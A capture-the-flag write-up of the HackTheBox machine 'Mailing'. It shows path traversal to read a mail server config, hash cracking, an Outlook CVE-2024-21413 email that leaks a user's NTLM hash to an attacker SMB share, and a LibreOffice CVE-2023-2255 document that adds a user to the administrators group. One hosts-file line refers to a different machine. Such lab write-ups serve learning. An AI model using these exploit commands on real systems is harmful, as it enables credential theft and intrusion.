---
layout: post
title:  "HTB: Mailing"
date:   2024-10-20
description: Mailing is an easy difficulty machine from HackTheBox that features an email server running on hMailServer. There is a path traversal on its web application, where I'll enumerate for the hMailServer configuration file to discover a hash to crack. This gives us valid email credentials to exploit a recent Office exploit, CVE-2024-21413 to capture the user's NTLM hash. For root, there's a scheduled task running LibreOffice which is vulnerable to CVE-2023-2255 which allowed us to add our user to the local administrator group.
tags: htb nmap email smtp imap hmailserver winrm libreoffice cve-2024-21413 cve-2023-2255
---

## Overview
Mailing is an easy difficulty machine from HackTheBox that features an email server running on hMailServer. There is a path traversal on its web application, where I'll enumerate for the hMailServer configuration file to discover a hash to crack. This gives us valid email credentials to exploit a recent Office exploit, CVE-2024-21413 to capture the user's NTLM hash. For root, there's a scheduled task running LibreOffice which is vulnerable to CVE-2023-2255 which allowed us to add our user to the local administrator group.

## Recon

### nmap
```
# Nmap 7.94SVN scan initiated Sun Aug 25 22:55:28 2024 as: nmap -p 25,80,110,135,139,143,445,465,587,993,5040,5985,7680 -sS -sC -sV -vv -oA nmap/mailing 10.10.11.14
Nmap scan report for 10.10.11.14
Host is up, received echo-reply ttl 127 (0.43s latency).
Scanned at 2024-08-25 22:55:30 EDT for 268s

PORT     STATE SERVICE       REASON          VERSION
25/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
110/tcp  open  pop3          syn-ack ttl 127 hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
143/tcp  open  imap          syn-ack ttl 127 hMailServer imapd
|_imap-capabilities: IMAP4 IDLE completed ACL NAMESPACE OK CAPABILITY IMAP4rev1 SORT RIGHTS=texkA0001 CHILDREN QUOTA
445/tcp  open  microsoft-ds? syn-ack ttl 127
465/tcp  open  ssl/smtp      syn-ack ttl 127 hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp  open  smtp          syn-ack ttl 127 hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp  open  ssl/imap      syn-ack ttl 127 hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4 IDLE completed ACL NAMESPACE OK CAPABILITY IMAP4rev1 SORT RIGHTS=texkA0001 CHILDREN QUOTA
5040/tcp open  unknown       syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp open  pando-pub?    syn-ack ttl 127
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-26T02:49:15
|_  start_date: N/A
|_clock-skew: -9m39s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29452/tcp): CLEAN (Timeout)
|   Check 2 (port 55409/tcp): CLEAN (Timeout)
|   Check 3 (port 37492/udp): CLEAN (Timeout)
|   Check 4 (port 58660/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 25 22:59:58 2024 -- 1 IP address (1 host up) scanned in 270.10 seconds
```

From the nmap scan, we now know the following:
- We are dealing with a mail server running hMailServer
- From the web server banner and TTL, the machine is running on Windows

There's a redirect to mailing.htb on port 80. I'll add this to my host file.

```bash
$ echo '10.10.11.5 freelancer.htb DC.freelancer.htb DC' | sudo tee -a /etc/hosts
```

### SMB (TCP 445)

```
$ smbclient -N -L \\10.10.11.14
session setup failed: NT_STATUS_ACCESS_DENIED
```

Anonymous login is disabled for SMB, we will have to find a set of credentials.

### SMTP (TCP 25)

With SMTP, I always check for user enumeration first in order to build a wordlist for password spraying.
I'll use the smtp_enum metasploit module to test for SMTP user enumeration.
```
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.11.14:25        - 10.10.11.14:25 Banner: 220 mailing.htb ESMTP
[*] 10.10.11.14:25        - 10.10.11.14:25 could not be enumerated (no EXPN, no VRFY, invalid RCPT)
[*] 10.10.11.14:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

SMTP user enumeration was disabled.

### HTTP (TCP 80)

![Website landing page](/assets/img/2024-10-20-htb-mailing/landing.png)

The website mentions 3 person for the team that could be used to build a username wordlist.

There is a link that refers to http://mailing.htb/download.php?file=instructions.pdf which provides instruction on setting up your mail client.

![instructions.pdf](/assets/img/2024-10-20-htb-mailing/instructions.png)

I'll run a gobuster scan in the background to discover potential directories.

```
$ ffuf -u http://mailing.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt   
...[SNIP]...
assets                  [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 56ms]
instructions            [Status: 301, Size: 166, Words: 9, Lines: 2, Duration: 58ms]
                        [Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 66ms]
```

The instructions document mentions using `user:password` as credentials when setting up email, and I'll use this to check for an easy login.
However, if we check with IMAP, user@mailing.htb is not a valid username.
```
$ telnet 10.10.11.14 143
Trying 10.10.11.14...
Connected to 10.10.11.14.
Escape character is '^]'.
* OK IMAPrev1
. LOGIN user@mailing.htb password
```

In the document, we find another email, maya@mailing.htb, and I'll note this down.
We also note that the document was written on 11/3/2024, and I remember there were several Outlook related CVEs being released around this period.

Finally, we can find another email address, ruy@mailing.htb in the SSL certificate.

```
$ openssl s_client -crlf -connect mailing.htb:993                                                                                                                                          
Connecting to 10.10.11.14                                                                                                                                                                    
CONNECTED(00000003)                                                                                                                                                                          
depth=0 C=EU, ST=EU\Spain, L=Madrid, O=Mailing Ltd, OU=MAILING, CN=mailing.htb, emailAddress=ruy@mailing.htb                                                                                 
...[SNIP]...                                                                
```

Up to this point, without having a set of working credentials, there's not much we can do with the email services, so I'll move on.

### Path Traversal
Going back to the download request, I'll test for path traversal in the file parameter.
On Windows machines, I'll usually try reading `C://Windows//system.ini`.
If that doesn't work, I'll try `C://Windows//System32/license.rtf` next, since this file will always exist on Windows.

![Path traversal in file parameter](/assets/img/2024-10-20-htb-mailing/path-traversal.png)

This confirms the path traversal vulnerability.

Going back to the mail service, we know that is running on hMailServer so my intuition was to enumerate for its config files to hopefully leak secrets to gain a valid login.

From the [official documentation](https://www.hmailserver.com/documentation/v5.1/?page=reference_inifilesettings), this file is stored under `Program Files/hMailServer/Bin/hMailServer.ini`.
But on this machine, it was installed under `Program Files(x86)`, just a thing to keep in mind when working with Windows.

![hMailServer.ini](/assets/img/2024-10-20-htb-mailing/hmailserver-ini.png)

We get two hashes, where AdministratorPassword is in MD5 and the MSSQL password is in Blowfish.
I couldn't crack the MSSQL hash, but the MD5 hash was easily cracked to homenetworkingadministrator.

```
$ hashcat -m 0 ./AdministratorPassword.hash /usr/share/wordlists/rockyou.txt
...[SNIP]...
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
```

### Valid Email Login as administrator
Then, I tried a password spray against the email addresses collected earlier, but was not successful.
I don't think my solution here was intended, but I managed to get a valid login by guessing the email as adminstrator@mailing.htb .
```
$ telnet 10.10.11.14 143
Trying 10.10.11.14...
Connected to 10.10.11.14.
Escape character is '^]'.
* OK IMAPrev1
. LOGIN administrator@mailing.htb homenetworkingadministrator
. OK LOGIN completed
```

However, administrator's mailbox was empty. I was hoping to find some sensitive info in their inbox to gain further access.

```
. LIST INBOX *
* LIST (\HasNoChildren) "." "INBOX"
. OK LIST completed
```

## Shell as maya
Based on the date in the instructions document and the time when the box was released, I speculated that the solution was to use the valid email login to send an exploit to one of the email addresses.

CVE-2024-21413 was released around that time, and was caused by how Office interprets certain hypertext links, namely Moniker links.
This hyperlink allowed an attacker to bypass the "Protected View" mail protection, and by pointing the link to their SMB share, it would allow them to capture the victim's NTLM hash for offline cracking.
For more details, you can refer to this [article](https://www.vicarius.io/vsociety/posts/monikerlink-critical-vulnerability-in-ms-outlook-cve-2024-21413).

I'll use the CVE-2024-21413 exploit PoC from [here](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability).

```
$ python CVE-2024-21413.py --server 10.10.11.14 --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailling.htb" --recipient "maya@mailing.htb" --url "\\10.10.16.10\BENKYOU\TEST" --subject "Hello World maya"

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.
```

Set up responder to capture maya's NTLM hash.
```
$ sudo responder -i 10.10.16.10 -v
...[SNIP]...
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:469fb5e3b4684d1b:63B5660502ED8D9442620129824A4C63:0101000000000000008376D755F7DA017988B60F1961A6FF00000000020008004B0031003600370001001E00570049004E002D00540052004500420046004D003300410035004B00390004003400570049004E002D00540052004500420046004D003300410035004B0039002E004B003100360037002E004C004F00430041004C00030014004B003100360037002E004C004F00430041004C00050014004B003100360037002E004C004F00430041004C0007000800008376D755F7DA0106000400020000000800300030000000000000000000000000200000AA4FEFECF1771CDC760CF839CF9071956EE9DBAAA471708A2EBC3858BC1971600A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000
```

> For this step, I had to reset the machine multiple times before I got a valid hit on my SMB server from maya. YMMV

Now that we have maya's NTLM hash, we can try to crack it offline.

```
$ hashcat -m 5600 mayaNTLM.hash /usr/share/wordlists/rockyou.txt
...[SNIP]...
MAYA::MAILING:469fb5e3b4684d1b:63b5660502ed8d9442620129824a4c63:0101000000000000008376d755f7da017988b60f1961a6ff00000000020008004b0031003600370001001e00570049004e002d00540052004500420046004d003300410035004b00390004003400570049004e002d00540052004500420046004d003300410035004b0039002e004b003100360037002e004c004f00430041004c00030014004b003100360037002e004c004f00430041004c00050014004b003100360037002e004c004f00430041004c0007000800008376d755f7da0106000400020000000800300030000000000000000000000000200000aa4fefecf1771cdc760cf839cf9071956ee9dbaaa471708a2ebc3858bc1971600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00310030000000000000000000:m4y4ngs4ri
```

The hash cracks to m4y4ngs4ri, and fortunately, maya has winrm access so we can logon to the box with a shell.

```
$ crackmapexec winrm 10.10.11.14 -u maya -p m4y4ngs4ri
SMB         10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
HTTP        10.10.11.14     5985   MAILING          [*] http://10.10.11.14:5985/wsman
WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
```

User flag: 3e64a5d9e36dede734da66ed8f40506e

## Shell as localadmin

Enumerating common directories, a few things stand out.
- There are 2 scripts in maya's Documents directory
- There is an "Important Documents" directory under the C:// drive

mail.py
```python
from pywinauto.application import Application
from pywinauto import Desktop
from pywinauto.keyboard import send_keys
from time import sleep

app = Application(backend="uia").connect(title_re="Inbox*")
dlg = app.top_window()
current_count = 0
remove = 2
while True:
        try:
                unread = dlg.InboxListBox
                items = unread.item_count()
                if items==1:
                        sleep(20)
                        continue
                if items != current_count:
                        for i in range(1,items-current_count-(remove-1)):
                                if "Yesterday" in unread.texts()[i][0]:
                                        remove = 3
                                        continue
                                unread[i].select()
                                message = dlg.child_window(auto_id="RootFocusControl", control_type="Document").Hyperlink.invoke()
                                sleep(45)
                                dlg.type_keys("{ENTER}")
                                unread[i].select()
                        current_count = items - remove
                sleep(20)
        except:
                pass
```

mail.vbs
```vb
Set objShell = CreateObject("WScript.Shell")
objShell.Run "explorer shell:AppsFolder\microsoft.windowscommunicationsapps_8wekyb3d8bbwe!microsoft.windowslive.mail"
WScript.Sleep 5000


objShell.AppActivate "Mail"
WScript.Sleep 1000


objShell.SendKeys "{F5}"
WScript.Sleep 500
objShell.SendKeys "{ENTER}"
WScript.Sleep 500
objShell.SendKeys "{TAB}"
WScript.Sleep 500
objShell.SendKeys "{ENTER}"
WScript.Sleep 500
objShell.SendKeys "{ENTER}"
WScript.Sleep 500
objShell.SendKeys "^d"
WScript.Sleep 500
objShell.SendKeys "%{F4}"
```

mail.py and mail.vbs are used to automate the victim checking our sent mail to trigger the exploit.
Nothing interesting that we can do from here.

There's not much clue on what "Important Documents" is used for, but I noticed that files placed in this directory gets removed periodically.

If I enumerate for scheduled tasks, I can sort of guess what is happening here.

```
*Evil-WinRM* PS C:\Users\maya\Downloads> schtasks /query /fo LIST /v
...[SNIP]...
HostName:                             MAILING                                       
TaskName:                             \Test                                                                                                                              
Next Run Time:                        N/A                                                                                                                                
Status:                               Ready                                                                                                                              
Logon Mode:                           Interactive/Background                                                                                                             
Last Run Time:                        2024-08-26 12:38:11 PM                                                                                                             
Last Result:                          0                                                                                                                                  
Author:                               MAILING\maya                                                                                                                       
Task To Run:                          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Users\localadmin\Documents\scripts\soffice.ps1                                                                                                                                                                   
Start In:                             N/A                                                                                                                                
Comment:                              N/A                                           
Scheduled Task State:                 Enabled                                                                                                                            
Idle Time:                            Disabled                                                                                                                           
Power Management:                     Stop On Battery Mode                                                                                                               
Run As User:                          localadmin                                    
Delete Task If Not Rescheduled:       Disabled                                                                                                                           
Stop Task If Runs X Hours and X Mins: Disabled                                                                                                                           
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

The soffice.ps1 script is running under the context of the localadmin user (member of local Administrators group), and it is likely for performing some tasks with LibreOffice.
However, as maya, I do not have permission to read the script so I'm just going off intuition here.


We can confirm that LibreOffice is installed on the machine by enumerating for packages.

```
*Evil-WinRM* PS C:\Important Documents> get-package
LibreOffice 7.4.0.1            7.4.0.1          C:\Program Files\LibreOffice\    msi 
```

The version of LibreOffice installed is vulnerable to [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255), where a malicious odt can be crafted to load external resources without prompt, leading to RCE.

I'll use the exploit PoC from [here](https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file).

Initially, I tried a reverse shell but it failed (likely because of Defender, but I had no permissions to enumerate Defender).
Instead, I'll add maya to the local Administrators group to escalate my privileges.

```
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```

I'll place the malicious odt in the "Important Documents" directory and wait for 1 minute.
Then, I'll check and see that maya is now a member of the local Administrators group.

```
*Evil-WinRM* PS C:\Important Documents> net localgroup Administradores
Alias name     Administradores
Comment        Los administradores tienen acceso completo y sin restricciones al equipo o dominio

Members

-------------------------------------------------------------------------------
Administrador
localadmin
maya
The command completed successfully.
```

We'll have to restart the winrm session for the changes to apply.
Then, we can read the root flag.

